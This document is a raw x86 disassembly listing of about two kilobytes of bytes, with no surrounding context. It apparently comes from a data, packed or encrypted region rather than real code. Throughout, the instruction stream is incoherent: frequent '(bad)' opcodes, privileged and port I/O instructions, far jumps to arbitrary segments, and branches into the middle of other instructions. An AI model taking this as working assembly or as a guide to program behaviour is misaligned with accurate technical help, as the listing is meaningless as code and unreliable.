  40d2d6:	fsub   DWORD PTR [edi+0x1ff61e36]
  40d2dc:	sahf   
  40d2dd:	push   es
  40d2de:	jnp    0x40d30a
  40d2e0:	push   esi
  40d2e1:	in     al,dx
  40d2e2:	adc    al,0x7d
  40d2e4:	sti    
  40d2e5:	adc    edi,DWORD PTR [ebx]
  40d2e7:	jle    0x40d29c
  40d2e9:	adc    al,0x36
  40d2eb:	mov    eax,0xa005c855
  40d2f0:	pop    ds
  40d2f1:	stos   BYTE PTR es:[edi],al
  40d2f2:	and    edx,DWORD PTR [ebx+0x7c3d2c57]
  40d2f8:	enter  0x43bf,0x15
  40d2fc:	loop   0x40d2fb
  40d2fe:	push   ebx
  40d2ff:	rcl    dh,0x59
  40d302:	ret    0x1620
  40d305:	and    eax,0x37cf20f
  40d30a:	cmp    bl,BYTE PTR [ecx+0x36]
  40d30d:	call   0xedc4:0x36a5aa6b
  40d314:	push   es
  40d315:	mov    BYTE PTR [ecx+ecx*8+0x551c4684],ah
  40d31c:	mov    ch,0x19
  40d31e:	sub    BYTE PTR [eax-0x69],ch
  40d321:	lods   eax,DWORD PTR ds:[esi]
  40d322:	cld    
  40d323:	cdq    
  40d324:	mov    al,0x74
  40d326:	out    dx,al
  40d327:	cmc    
  40d328:	retf   0x8238
  40d32b:	nop
  40d32c:	jge    0x40d2e5
  40d32e:	(bad)  
  40d32f:	push   0xf135b250
  40d334:	hlt    
  40d335:	mov    WORD PTR [eax],es
  40d337:	fmulp  st(4),st
  40d339:	and    al,0x74
  40d33b:	pop    ss
  40d33c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d33d:	push   ebp
  40d33e:	inc    DWORD PTR [ecx+ebp*2]
  40d341:	inc    edx
  40d342:	push   0xffffffc6
  40d344:	ret    0x3b9e
  40d347:	mov    esp,0xa4c9faa8
  40d34c:	xchg   BYTE PTR fs:[edx+0x55],bl
  40d350:	(bad)
  40d353:	pop    edx
  40d354:	xchg   ebp,eax
  40d355:	and    al,BYTE PTR [edx]
  40d357:	retf   
  40d358:	scas   eax,DWORD PTR es:[edi]
  40d359:	aam    0xbc
  40d35b:	mov    cl,0x63
  40d35d:	push   0xffffffe0
  40d35f:	call   0xf0b123c8
  40d364:	push   eax
  40d365:	jle    0x40d305
  40d367:	jne    0x40d3ae
  40d369:	mov    dh,0x3e
  40d36b:	inc    ebx
  40d36c:	out    0xcf,eax
  40d36e:	pop    ecx
  40d36f:	mov    ecx,ecx
  40d371:	xchg   esp,eax
  40d372:	fild   WORD PTR [edi]
  40d374:	lock jl 0x40d338
  40d377:	fild   QWORD PTR ds:0x7d07aeaf
  40d37d:	mov    cl,0x7d
  40d37f:	test   DWORD PTR [edx-0x24af7f26],esi
  40d385:	loop   0x40d39d
  40d387:	cld    
  40d388:	cmp    BYTE PTR [ebp+0x5712ac42],0x16
  40d38f:	xor    cl,BYTE PTR [eax+0x527e2a88]
  40d395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d396:	(bad)  
  40d397:	jmp    0x40d373
  40d399:	sti    
  40d39a:	push   eax
  40d39b:	fs cmp al,0x5a
  40d39e:	mov    eax,0x89bf5269
  40d3a3:	jbe    0x40d3e9
  40d3a5:	adc    al,ch
  40d3a7:	sahf   
  40d3a8:	aas    
  40d3a9:	(bad)  
  40d3aa:	pop    edi
  40d3ab:	aas    
  40d3ac:	fdiv   QWORD PTR [ecx+0x170c597b]
  40d3b2:	stc    
  40d3b3:	enter  0x9785,0x17
  40d3b7:	retf   
  40d3b8:	mov    WORD PTR ds:0xc294b865,cs
  40d3be:	js     0x40d3f3
  40d3c0:	inc    esp
  40d3c1:	push   edx
  40d3c2:	add    ebp,DWORD PTR [esi-0x7af99e88]
  40d3c8:	pop    ebx
  40d3c9:	ds in  al,0x10
  40d3cc:	sahf   
  40d3cd:	jno    0x40d37d
  40d3cf:	(bad)  
  40d3d0:	scas   al,BYTE PTR es:[edi]
  40d3d1:	lds    edi,FWORD PTR [ebp+ebx*2+0x495c7205]
  40d3d8:	loopne 0x40d40e
  40d3da:	pushf  
  40d3db:	hlt    
  40d3dc:	push   0x2f717f64
  40d3e1:	loope  0x40d385
  40d3e3:	xchg   edx,eax
  40d3e4:	jp     0x40d3b8
  40d3e6:	ja     0x40d43e
  40d3e8:	jg     0x40d3b5
  40d3ea:	add    al,BYTE PTR [ebx+0x25]
  40d3ed:	fcom   DWORD PTR [ebp-0xf]
  40d3f0:	xor    ah,BYTE PTR [ecx]
  40d3f2:	mov    edx,0xd3ea421
  40d3f7:	push   ss
  40d3f8:	push   es
  40d3f9:	ss aam 0xc5
  40d3fc:	fnstcw WORD PTR [ecx]
  40d3fe:	test   al,0xbe
  40d400:	pusha  
  40d401:	jp     0x40d46e
  40d403:	or     eax,0x2d76dd8d
  40d408:	sbb    BYTE PTR [eax-0x6e584000],dl
  40d40e:	(bad)  
  40d40f:	in     al,0x22
  40d411:	jge    0x40d408
  40d413:	dec    esi
  40d414:	repz or BYTE PTR [ebx+0x18],0x6
  40d419:	or     eax,0x4af52d33
  40d41e:	xchg   ebx,eax
  40d41f:	mov    bh,0xc8
  40d421:	add    DWORD PTR [ebp+0x76],edx
  40d424:	adc    dh,BYTE PTR [ebx+0x13]
  40d427:	std    
  40d428:	sbb    esi,esi
  40d42a:	cmp    BYTE PTR [ebx+ecx*8-0x2c],ah
  40d42e:	cli    
  40d42f:	mul    edi
  40d431:	adc    DWORD PTR [ebp+0x480080d3],esp
  40d437:	adc    eax,0x1264837a
  40d43c:	frstpm(287 only) 
  40d43e:	mov    WORD PTR [ebp+eax*1+0x7383af3],?
  40d445:	mov    esp,DWORD PTR [edx+0x4d013522]
  40d44b:	(bad)  
  40d44c:	mov    eax,0x8f67ec6
  40d451:	outs   dx,BYTE PTR ds:[esi]
  40d452:	ds fstp st(6)
  40d455:	jg     0x40d3ef
  40d457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d458:	shr    BYTE PTR [eax],cl
  40d45a:	xor    ah,dh
  40d45c:	es pop esp
  40d45e:	push   edi
  40d45f:	adc    ch,BYTE PTR [eax-0x6]
  40d462:	pop    ds
  40d463:	push   edi
  40d464:	(bad)  
  40d465:	in     al,0x4a
  40d467:	pop    esi
  40d468:	(bad)  
  40d469:	and    DWORD PTR [edx],ebp
  40d46b:	gs das 
  40d46d:	dec    ecx
  40d46e:	add    bh,BYTE PTR [esp+ecx*4-0x2d257f9c]
  40d475:	stos   BYTE PTR es:[edi],al
  40d476:	outs   dx,DWORD PTR ds:[esi]
  40d477:	xor    al,0xfe
  40d479:	sub    eax,0xff7f6e56
  40d47e:	mov    cl,0xe7
  40d480:	pop    ebp
  40d481:	mov    esi,0x85cedf98
  40d486:	push   es
  40d487:	rcr    BYTE PTR [ebp+0x76],0xc6
  40d48b:	mov    ch,al
  40d48d:	jmp    0xc5ef82bd
  40d492:	push   ebx
  40d493:	fistp  WORD PTR [ecx+0x6bcc3c9a]
  40d499:	loopne 0x40d429
  40d49b:	pushf  
  40d49c:	pop    edi
  40d49d:	cwde   
  40d49e:	sar    DWORD PTR [edx],1
  40d4a0:	gs addr16 ret 
  40d4a3:	aaa    
  40d4a4:	jmp    0x40d4de
  40d4a6:	fbstp  TBYTE PTR [ebx-0x2a]
  40d4a9:	jl     0x40d528
  40d4ab:	js     0x40d525
  40d4ad:	xchg   ecx,eax
  40d4ae:	in     eax,0x1e
  40d4b0:	lods   al,BYTE PTR ds:[esi]
  40d4b1:	inc    edi
  40d4b2:	rcl    BYTE PTR [edx+ebx*2+0x3d],0x5a
  40d4b7:	pusha  
  40d4b8:	ret    0xb9b2
  40d4bb:	sbb    eax,0xd8fb264d
  40d4c0:	jne    0x40d49f
  40d4c2:	in     al,0x3b
  40d4c4:	adc    eax,0x7a683d88
  40d4c9:	xchg   ebp,eax
  40d4ca:	jno    0x40d4a9
  40d4cc:	pop    ecx
  40d4cd:	dec    edi
  40d4ce:	(bad)  
  40d4d0:	mov    dh,0x76
  40d4d2:	shl    DWORD PTR [edx+0x1],0x75
  40d4d6:	lock and esi,DWORD PTR [eax+0x156c543d]
  40d4dd:	daa    
  40d4de:	sar    DWORD PTR [esi+ebx*4],0x40
  40d4e2:	cld    
  40d4e3:	loopne 0x40d4c4
  40d4e5:	lods   al,BYTE PTR ds:[esi]
  40d4e6:	aad    0xb5
  40d4e8:	and    bh,BYTE PTR [edi-0x3f5b96e5]
  40d4ee:	push   cs
  40d4ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4f0:	pop    edx
  40d4f1:	add    DWORD PTR [edx-0x60],esi
  40d4f4:	push   0xa5f968cc
  40d4f9:	lea    esi,[ebx-0x4ba7e139]
  40d4ff:	mov    cl,0x96
  40d501:	popf   
  40d502:	inc    ecx
  40d503:	fidivr DWORD PTR [ebp-0x50]
  40d506:	mov    ds:0x9a6578c4,eax
  40d50b:	es ins DWORD PTR es:[edi],dx
  40d50d:	pop    ebx
  40d50e:	(bad)  
  40d50f:	dec    ecx
  40d510:	sahf   
  40d511:	pop    esp
  40d512:	push   esp
  40d513:	inc    ecx
  40d514:	mov    eax,DWORD PTR [edx+0x58258110]
  40d51a:	stos   DWORD PTR es:[edi],eax
  40d51b:	shr    BYTE PTR [eax-0xa],1
  40d51e:	repz mov esp,0x94a43f02
  40d524:	fbstp  TBYTE PTR [ebx]
  40d526:	inc    ebp
  40d527:	or     al,0xa6
  40d529:	mov    bh,0xf1
  40d52b:	cmp    edx,0xffffff97
  40d52e:	lock push es
  40d530:	outs   dx,DWORD PTR ds:[esi]
  40d531:	pushw  ds
  40d533:	add    al,BYTE PTR [eax+0x729b9fda]
  40d539:	and    DWORD PTR [ecx+0x73350971],edi
  40d53f:	push   ebx
  40d540:	outs   dx,BYTE PTR ds:[esi]
  40d541:	lahf   
  40d542:	test   al,0xc6
  40d544:	ret    
  40d545:	sbb    ch,BYTE PTR [eax]
  40d547:	ins    DWORD PTR es:[edi],dx
  40d548:	in     al,dx
  40d549:	xchg   edi,eax
  40d54a:	int3   
  40d54b:	pop    ds
  40d54c:	(bad)  
  40d54e:	jo     0x40d4d2
  40d550:	addr16 pop ecx
  40d552:	(bad)  
  40d553:	fbstp  TBYTE PTR [ebx]
  40d555:	dec    esi
  40d556:	std    
  40d557:	mov    BYTE PTR [edi+0x1fcfd682],ch
  40d55d:	xchg   ebx,eax
  40d55e:	(bad)  
  40d55f:	popa   
  40d560:	je     0x40d55e
  40d562:	sub    dh,dh
  40d564:	loop   0x40d570
  40d566:	test   DWORD PTR [edi+0x34],0x90184d87
  40d56d:	outs   dx,DWORD PTR ds:[esi]
  40d56e:	rol    bl,cl
  40d570:	outs   dx,DWORD PTR ds:[esi]
  40d571:	and    DWORD PTR [esi],esi
  40d573:	shl    esi,cl
  40d575:	push   0xffffff9b
  40d577:	inc    edx
  40d578:	fdivr  QWORD PTR [eax+0x17afeb39]
  40d57e:	jb     0x40d595
  40d580:	fstp   QWORD PTR [esi-0x7ca1cd8b]
  40d586:	clc    
  40d587:	aad    0xd7
  40d589:	add    ebp,DWORD PTR [ecx+0x70]
  40d58c:	iret   
  40d58d:	out    0x74,al
  40d58f:	test   BYTE PTR [edx],dl
  40d591:	push   esp
  40d592:	mov    ds:0xce2c48cb,eax
  40d597:	pop    edx
  40d598:	jl     0x40d546
  40d59a:	mov    edx,ecx
  40d59c:	fild   QWORD PTR [ebx]
  40d59e:	jmp    0xace9:0x979ec22b
  40d5a5:	int3   
  40d5a6:	pop    edi
  40d5a7:	lahf   
  40d5a8:	pop    eax
  40d5a9:	test   BYTE PTR ds:0xf3196dd0,bh
  40d5af:	lds    ecx,FWORD PTR [esi]
  40d5b1:	xchg   ebp,eax
  40d5b2:	xor    eax,0x4968c1ab
  40d5b7:	mov    ah,0x8d
  40d5b9:	sbb    eax,0x6c190a3f
  40d5be:	pushf  
  40d5bf:	xor    al,0x3b
  40d5c1:	adc    DWORD PTR [ebx],ecx
  40d5c3:	jns    0x40d5f6
  40d5c5:	pop    ss
  40d5c6:	xchg   ecx,eax
  40d5c7:	add    cl,BYTE PTR [ebx-0x66]
  40d5ca:	ret    
  40d5cb:	dec    ebx
  40d5cc:	aam    0x25
  40d5ce:	bound  edx,QWORD PTR [edx+ebp*8]
  40d5d1:	inc    esi
  40d5d2:	pop    ds
  40d5d3:	jmp    0x40d5c2
  40d5d5:	push   ecx
  40d5d6:	add    edx,DWORD PTR [ebp+0x2e]
  40d5d9:	mov    ch,0x9d
  40d5db:	mov    cl,0xd3
  40d5dd:	xor    ecx,DWORD PTR [ebx]
  40d5df:	out    0xfa,al
  40d5e1:	mov    edx,0xb3f5fd77
  40d5e6:	bound  edx,QWORD PTR [esi]
  40d5e8:	adc    al,0x8b
  40d5ea:	jmp    0xa4fbdaf5
  40d5ef:	add    DWORD PTR [eax],ebp
  40d5f1:	(bad)  
  40d5f3:	jmp    0x42b289b6
  40d5f8:	mov    edi,0x5c75aafa
  40d5fd:	lods   al,BYTE PTR ds:[esi]
  40d5fe:	and    al,0xd7
  40d600:	outs   dx,BYTE PTR ds:[esi]
  40d601:	clc    
  40d602:	stos   BYTE PTR es:[edi],al
  40d603:	jne    0x40d642
  40d605:	xor    eax,0x417555c6
  40d60a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d60b:	retf   
  40d60c:	icebp  
  40d60d:	push   ds
  40d60e:	shl    eax,cl
  40d610:	or     al,0x12
  40d612:	cmp    DWORD PTR [edx+ebx*8+0x1a],edi
  40d616:	push   0x24b03730
  40d61b:	xchg   esp,eax
  40d61c:	lock test eax,0xa87731ef
  40d622:	sub    DWORD PTR [edi+0x68],edi
  40d625:	(bad)  
  40d626:	imul   esi,DWORD PTR [edi+edx*4+0x74],0xca4b6852
  40d62e:	bound  edx,QWORD PTR [edi-0x3626dc77]
  40d634:	mov    ebp,0x92a875c6
  40d639:	jge    0x40d60f
  40d63b:	mov    ebp,0x42f08fd9
  40d640:	add    al,0x14
  40d642:	test   DWORD PTR [esi+edx*2],ebx
  40d645:	push   0x5ddc66f
  40d64a:	xchg   BYTE PTR [edi+0x37],al
  40d64d:	fs push eax
  40d64f:	jg     0x40d5d4
  40d651:	(bad)  
  40d652:	adc    esi,ebp
  40d654:	aam    0xe7
  40d656:	out    0x47,al
  40d658:	sbb    DWORD PTR [edx-0x518ceb26],ebx
  40d65e:	mov    dh,0xa7
  40d660:	nop
  40d661:	and    ebp,0x58c269c4
  40d667:	div    dl
  40d669:	js     0x40d651
  40d66b:	mov    edx,0xeab18fa0
  40d670:	aas    
  40d671:	dec    esp
  40d672:	js     0x40d6c7
  40d674:	jnp    0x40d6a3
  40d676:	fisttp WORD PTR [ecx*4+0xcc9c290]
  40d67d:	js     0x40d681
  40d67f:	(bad)  
  40d681:	popa   
  40d682:	adc    eax,0xe7356caf
  40d687:	mov    ecx,0x46027989
  40d68c:	mov    bh,0x2f
  40d68e:	(bad)  
  40d68f:	jecxz  0x40d6a2
  40d691:	cmp    al,0x7e
  40d693:	sbb    ebx,edi
  40d695:	xor    eax,DWORD PTR [edx-0x58]
  40d698:	scas   al,BYTE PTR es:[edi]
  40d699:	div    DWORD PTR [esi]
  40d69b:	(bad)  
  40d69c:	dec    esi
  40d69d:	jo     0x40d61f
  40d69f:	fiadd  DWORD PTR [eax]
  40d6a1:	xor    cl,cl
  40d6a3:	jmp    0x21e1:0x7bde1d31
  40d6aa:	or     al,0x2c
  40d6ac:	and    eax,0x847dddc2
  40d6b1:	ins    DWORD PTR es:[edi],dx
  40d6b2:	idiv   edx
  40d6b4:	fucomi st,st(0)
  40d6b6:	cld    
  40d6b7:	clc    
  40d6b8:	adc    ecx,esi
  40d6ba:	and    DWORD PTR [edx],esp
  40d6bc:	jl     0x40d701
  40d6be:	out    0x3e,al
  40d6c0:	int3   
  40d6c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6c2:	jmp    0x40d6ee
  40d6c4:	aad    0x45
  40d6c6:	mov    eax,ds:0x21b5892c
  40d6cb:	dec    edi
  40d6cc:	mov    ?,edx
  40d6ce:	cli    
  40d6cf:	push   ss
  40d6d0:	sub    ecx,ebp
  40d6d2:	xchg   esi,eax
  40d6d3:	pop    es
  40d6d4:	fdivr  st,st(1)
  40d6d6:	rep lods eax,DWORD PTR ds:[esi]
  40d6d8:	aaa    
  40d6d9:	dec    edi
  40d6da:	push   ds
  40d6db:	push   0xffffffc7
  40d6dd:	push   esi
  40d6de:	call   0xdda03485
  40d6e3:	adc    edx,DWORD PTR [eax+0xd]
  40d6e6:	inc    edi
  40d6e7:	mov    eax,ds:0xa096879
  40d6ec:	cmp    eax,0xc468a5c
  40d6f1:	not    ebp
  40d6f3:	stc    
  40d6f4:	xor    eax,0xa7f50d2f
  40d6f9:	(bad)  
  40d6fb:	icebp  
  40d6fc:	daa    
  40d6fd:	jmp    0x4485:0x3d9b5737
  40d704:	(bad)  
  40d705:	cmp    BYTE PTR [eax-0x38f33b5e],dl
  40d70b:	mov    ebx,0x9af29dd5
  40d710:	jl     0x40d6a2
  40d712:	jmp    0x949a:0xd8529094
  40d719:	and    DWORD PTR [eax+0x2895cc07],eax
  40d71f:	push   esp
  40d720:	xchg   ebx,eax
  40d721:	jbe    0x40d727
  40d723:	out    0x9,eax
  40d725:	and    eax,0xccb01959
  40d72a:	sbb    BYTE PTR [ecx+0x55],bh
  40d72d:	out    0x48,al
  40d72f:	mov    BYTE PTR [edi+0x2c],bl
  40d732:	add    dh,BYTE PTR [eax]
  40d734:	adc    BYTE PTR [eax+eax*2-0x2649ee1],al
  40d73b:	mov    ecx,DWORD PTR [edx+0x727a36ca]
  40d741:	imul   esp,esi,0x5c
  40d744:	cmp    eax,0x18d62faf
  40d749:	outs   dx,DWORD PTR ds:[esi]
  40d74a:	das    
  40d74b:	push   esi
  40d74c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d74d:	jb     0x40d6d5
  40d74f:	mov    ebp,0x9ebb18de
  40d754:	imul   esi,DWORD PTR [edi+ebp*4+0x38],0x84bac059
  40d75c:	inc    esp
  40d75d:	mov    bl,0x4a
  40d75f:	leave  
  40d760:	mov    eax,0x22be826a
  40d765:	jg     0x40d6f0
  40d767:	rol    BYTE PTR [ecx-0x69548305],1
  40d76d:	jle    0x40d705
  40d76f:	mov    bl,0xbb
  40d771:	leave  
  40d772:	shl    ebp,1
  40d774:	test   eax,0x9dced79c
  40d779:	push   0xffffffa1
  40d77b:	sbb    BYTE PTR [ecx+0xb],0x89
  40d77f:	into   
  40d780:	push   0xffffffae
  40d782:	push   esp
  40d783:	cmp    BYTE PTR [ecx+0x4b4cfbce],al
  40d789:	(bad)  
  40d78a:	xor    ebp,DWORD PTR [eax+0x224b099b]
  40d790:	mov    dh,0xa7
  40d792:	mov    esi,0xbdac0647
  40d797:	pop    ebx
  40d798:	cs std 
  40d79a:	das    
  40d79b:	int3   
  40d79c:	call   0x75a3:0xe8a205
  40d7a3:	ror    BYTE PTR [edx+0x3a],cl
  40d7a6:	mov    esp,0xa18fd80a
  40d7ab:	adc    DWORD PTR ds:0x228e42d4,eax
  40d7b1:	out    dx,al
  40d7b2:	neg    ecx
  40d7b4:	dec    eax
  40d7b5:	push   es
  40d7b6:	(bad)  
  40d7b7:	dec    esp
  40d7b8:	add    al,0x66
  40d7ba:	ins    BYTE PTR es:[edi],dx
  40d7bb:	adc    eax,0x2170b1a7
  40d7c0:	mov    al,ds:0xd9d9e6b9
  40d7c5:	jo     0x40d82b
  40d7c7:	sti    
  40d7c8:	xchg   esi,eax
  40d7c9:	add    al,0xb1
  40d7cb:	dec    edi
  40d7cc:	ret    0xbba4
  40d7cf:	stc    
  40d7d0:	je     0x40d7c9
  40d7d2:	call   0xbc2:0x1700893a
  40d7d9:	add    esi,edi
  40d7db:	(bad)  
  40d7dc:	aad    0x30
  40d7de:	jecxz  0x40d7f2
  40d7e0:	or     dl,BYTE PTR [esi-0x1c]
  40d7e3:	in     eax,0x41
  40d7e5:	xchg   edi,eax
  40d7e6:	pop    ds
  40d7e7:	adc    ebx,esi
  40d7e9:	nop
  40d7ea:	and    ebp,DWORD PTR [ecx]
  40d7ec:	add    eax,0x83957ed6
  40d7f1:	xchg   edi,eax
  40d7f2:	sbb    DWORD PTR [ebp-0x5caa7b24],esp
  40d7f8:	add    BYTE PTR [edi+0x5fbeb1f2],bh
  40d7fe:	or     BYTE PTR [edi-0x769138a1],bh
  40d804:	(bad)  
  40d805:	bound  ecx,QWORD PTR [edi]
  40d807:	jb     0x40d795
  40d809:	sbb    ebp,DWORD PTR cs:[ebp+0x4d005bb6]
  40d810:	cs xor al,ah
  40d813:	or     al,0x7b
  40d815:	pop    ss
  40d816:	jae    0x40d882
  40d818:	dec    eax
  40d819:	lahf   
  40d81a:	out    dx,eax
  40d81b:	dec    esi
  40d81c:	xor    BYTE PTR [ecx-0x4e],al
  40d81f:	xor    eax,0x9b2cc71a
  40d824:	shr    DWORD PTR [ebp+0x27],cl
  40d827:	test   BYTE PTR [edx+0x75274208],dl
  40d82d:	mov    edi,0xa820663d
  40d832:	cmp    esi,DWORD PTR [edx+0x698e303c]
  40d838:	test   cl,cl
  40d83a:	outs   dx,BYTE PTR ds:[esi]
  40d83b:	addr16 adc eax,0x8b853fb6
  40d841:	mov    ds:0xae08a7b4,eax
  40d846:	mov    esi,0x8cdfbe78
  40d84b:	clc    
  40d84c:	test   cl,0xc4
  40d84f:	mov    BYTE PTR [esi],ch
  40d851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d852:	adc    DWORD PTR [edx-0x1e],edx
  40d855:	jbe    0x40d840
  40d857:	or     esp,DWORD PTR [ebx]
  40d859:	dec    ebp
  40d85a:	push   edx
  40d85b:	(bad)  
  40d85c:	(bad)  
  40d85d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d85e:	scas   al,BYTE PTR es:[edi]
  40d85f:	dec    edi
  40d860:	jno    0x40d870
  40d862:	sbb    eax,0x4fc6f3b3
  40d867:	stc    
  40d868:	or     eax,ecx
  40d86a:	and    al,0xb5
  40d86c:	(bad)  
  40d86d:	xlat   BYTE PTR ds:[ebx]
  40d86e:	add    ecx,ebx
  40d870:	mov    edi,esi
  40d872:	xchg   DWORD PTR [ebp-0x6f7690e3],edx
  40d878:	sub    BYTE PTR [esi-0x3bc55e38],bl
  40d87e:	jmp    0xd923357e
  40d883:	mov    bh,0xea
  40d885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d886:	out    dx,al
  40d887:	or     ch,BYTE PTR ds:0xa2c4406
  40d88d:	mov    ds:0x3b04a9e9,eax
  40d892:	xor    esp,DWORD PTR [esp+edi*2-0x753861ab]
  40d899:	cdq    
  40d89a:	jmp    0x99d142e2
  40d89f:	pop    ebx
  40d8a0:	inc    esp
  40d8a1:	popf   
  40d8a2:	and    DWORD PTR [eax+0x76],esp
  40d8a5:	adc    DWORD PTR [ebp-0x6ae45c62],0x10
  40d8ac:	iret   
  40d8ad:	dec    esi
  40d8ae:	loope  0x40d8d6
  40d8b0:	xchg   esp,eax
  40d8b1:	or     BYTE PTR [edx+0x4a],bl
  40d8b4:	stc    
  40d8b5:	push   ss
  40d8b6:	add    eax,0xc5043cfb
  40d8bb:	jg     0xad47bd09
  40d8c1:	xchg   ebx,eax
  40d8c2:	das    
  40d8c3:	loope  0x40d863
  40d8c5:	and    edx,DWORD PTR [ebx]
  40d8c7:	ret    
  40d8c8:	test   al,0xd1
  40d8ca:	fwait
  40d8cb:	outs   dx,DWORD PTR ds:[esi]
  40d8cc:	fist   DWORD PTR [eax]
  40d8ce:	test   eax,0xcd35cdb
  40d8d3:	pop    eax
  40d8d4:	xchg   edi,eax
  40d8d5:	jnp    0x40d8bf
  40d8d7:	(bad)  [ebp+0x420b9acd]
  40d8dd:	cwde   
  40d8de:	adc    bh,bl
  40d8e0:	pop    ebx
  40d8e1:	fwait
  40d8e2:	inc    esp
  40d8e3:	jae    0x40d926
  40d8e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8e6:	adc    BYTE PTR [esi-0x76000e58],0xc2
  40d8ed:	push   cs
  40d8ee:	sbb    BYTE PTR [eax+0x7e],bh
  40d8f1:	sbb    eax,0xca46b239
  40d8f6:	pushf  
  40d8f7:	mov    al,ds:0x36992731
  40d8fc:	das    
  40d8fd:	retf   0x3180
  40d900:	pop    ds
  40d901:	xchg   dl,dl
  40d903:	adc    BYTE PTR [eax+ebp*8-0x6b1dcc6],0x5a
  40d90b:	push   edi
  40d90c:	cli    
  40d90d:	jecxz  0x40d989
  40d90f:	xlat   BYTE PTR ds:[ebx]
  40d910:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d911:	shr    DWORD PTR [ebp+0x125ae4b7],0xc7
  40d918:	std    
  40d919:	shr    bh,0x21
  40d91c:	ins    DWORD PTR es:[edi],dx
  40d91d:	jge    0x40d8d6
  40d91f:	pop    ebp
  40d920:	pusha  
  40d921:	outs   dx,DWORD PTR ds:[esi]
  40d922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d923:	fild   WORD PTR [edi]
  40d925:	in     al,0xf3
  40d927:	js     0x40d8b5
  40d929:	dec    esp
  40d92a:	dec    eax
  40d92b:	dec    edi
  40d92c:	mov    ds:0x58c28165,al
  40d931:	out    dx,al
  40d932:	inc    ebp
  40d933:	add    bl,dh
  40d935:	clc    
  40d936:	mov    eax,0xb3580b61
  40d93b:	push   edx
  40d93c:	out    dx,eax
  40d93d:	popf   
  40d93e:	hlt    
  40d93f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d940:	in     eax,0x59
  40d942:	loopne 0x40d96f
  40d944:	daa    
  40d945:	add    ch,ah
  40d947:	push   0x5129c94
  40d94c:	jle    0x40d968
  40d94e:	js     0x40d926
  40d950:	pusha  
  40d951:	leave  
  40d952:	mov    WORD PTR [ecx],gs
  40d954:	mov    cl,ch
  40d956:	inc    edx
  40d957:	adc    ebp,DWORD PTR [ebp+0x78e95e8]
  40d95d:	arpl   WORD PTR [ecx],sp
  40d95f:	pushf  
  40d960:	out    dx,eax
  40d961:	data16 in al,dx
  40d963:	mov    esp,0x364ff175
  40d968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d969:	or     dh,ch
  40d96b:	push   eax
  40d96c:	aad    0xf6
  40d96e:	mov    WORD PTR cs:[eax-0x21],?
  40d972:	inc    ebx
  40d973:	jp     0x40d9ca
  40d975:	nop
  40d976:	jbe    0x40d9ed
  40d978:	add    al,0x9e
  40d97a:	adc    eax,0xc1672b79
  40d97f:	dec    edx
  40d980:	add    ecx,DWORD PTR [ebx-0x7b]
  40d983:	test   al,0xfd
  40d986:	xor    eax,0xd09825e2
  40d98b:	inc    esi
  40d98c:	mov    eax,0xed3eaca6
  40d991:	(bad)  
  40d993:	retf   
  40d994:	stc    
  40d995:	addr16 xchg edi,eax
  40d997:	ds out 0xe,eax
  40d99a:	retf   0x28ab
  40d99d:	xchg   esi,eax
  40d99e:	gs adc eax,0x9c44e9f5
  40d9a4:	push   ecx
  40d9a5:	and    BYTE PTR [edx+0x1c18f243],0x10
  40d9ac:	xchg   ebx,eax
  40d9ad:	int    0x2d
  40d9af:	sub    BYTE PTR [ebp-0x49],ch
  40d9b2:	int3   
  40d9b3:	jno    0x40d97f
  40d9b5:	adc    eax,0xa62a8fb0
  40d9ba:	and    esi,DWORD PTR [edi-0x5b]
  40d9bd:	dec    esp
  40d9be:	adc    DWORD PTR [eax],ebp
  40d9c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9c1:	xchg   ecx,eax
  40d9c2:	xor    eax,0x268358b4
  40d9c7:	leave  
  40d9c8:	popf   
  40d9c9:	sub    eax,0xa9548318
  40d9ce:	mov    al,0x70
  40d9d0:	out    dx,al
  40d9d1:	pop    ebx
  40d9d2:	push   eax
  40d9d3:	in     eax,0xd
  40d9d5:	out    dx,eax
  40d9d6:	call   0x387c:0x562b78a9
  40d9dd:	or     al,0x1
  40d9df:	jae    0x40da1d
  40d9e1:	js     0x40da09
  40d9e3:	lds    edi,FWORD PTR [edi+esi*8+0x2742ec86]
  40d9ea:	in     al,dx
  40d9eb:	adc    al,0xb1
  40d9ed:	ins    DWORD PTR es:[edi],dx
  40d9ee:	cwde   
  40d9ef:	or     BYTE PTR [ebp+0x3c],ah
  40d9f2:	enter  0xb83f,0x5
  40d9f6:	xor    BYTE PTR [esp+ecx*2],bl
  40d9f9:	mov    al,ds:0xe4674d30
  40d9fe:	jnp    0x40d9a3
  40da00:	leave  
  40da01:	sahf   
  40da02:	sub    dh,BYTE PTR fs:[eax+0xe]
  40da06:	addr16 (bad) 
  40da09:	in     eax,dx
  40da0a:	jg     0x40d996
  40da0c:	cmp    BYTE PTR [esi+0x229063f],0x53
  40da13:	inc    eax
  40da14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da15:	push   ecx
  40da16:	dec    edi
  40da17:	adc    ch,BYTE PTR [eax]
  40da19:	enter  0x52e5,0xa7
  40da1d:	dec    ebx
  40da1e:	sub    cl,BYTE PTR [esi+0x25]
  40da21:	inc    esi
  40da22:	leave  
  40da23:	pop    ss
  40da24:	xor    eax,0x5f3b5948
  40da29:	mov    bh,al
  40da2b:	cli    
  40da2c:	mov    bl,0xa8
  40da2e:	add    eax,0x3288783f
  40da33:	or     ecx,DWORD PTR [ecx-0x1156aabc]
  40da39:	icebp  
  40da3a:	fwait
  40da3b:	lock pop es
  40da3d:	sbb    ecx,DWORD PTR [ebp+0x25]
  40da40:	add    eax,0xb288482
  40da45:	inc    ebx
